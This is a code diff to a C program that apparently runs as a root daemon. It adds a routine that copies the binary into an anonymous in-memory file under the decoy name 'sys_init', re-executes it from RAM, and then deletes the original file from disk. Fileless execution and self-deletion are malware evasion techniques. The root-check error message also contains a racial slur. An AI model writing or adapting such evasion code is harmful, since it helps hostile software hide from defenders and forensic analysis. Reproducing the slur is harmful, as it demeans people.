@@ -117,10 +117,44 @@ void ZombieManager(int sig){
     while(waitpid(-1, NULL, WNOHANG) > 0);
 }
 
+void Pivot2RAM(char **argv){
+    // create anonymous file in RAM
+    int mem_fd = memfd_create("sys_init", MFD_CLOEXEC);
+    if(mem_fd < 0) return;
+
+    // open our current binary on disk
+    int disk_fd = open("/proc/self/exe", O_RDONLY);
+    if(disk_fd < 0) return;
+
+    // copy from disk to RAM
+    char buffer[4096];
+    ssize_t bytes;
+    while((bytes = read(disk_fd, buffer, sizeof(buffer))) > 0){
+        write(mem_fd, buffer, bytes);
+    }
+    close(disk_fd);
+
+    // the secret handshake
+    char *env[]= {"daemon=1", NULL};
+
+    // execute from RAM with fd
+    fexecve(mem_fd, argv, env);
+}
+
 int main(int argc, char *argv[]){
+    // check for root
     if(getuid() != 0){
         printf("root privileges needed negro!");
         exit(EXIT_FAILURE);
+    }
+
+    // fexecve replaces the current process, starts new one with main()
+    if(getenv("daemon") == NULL){
+        // get it to pivot
+        Pivot2RAM(argv);                
+    } else {
+        // pivot success, delete from disk
+        unlink(argv[0]);
     }
 
     daemonize();
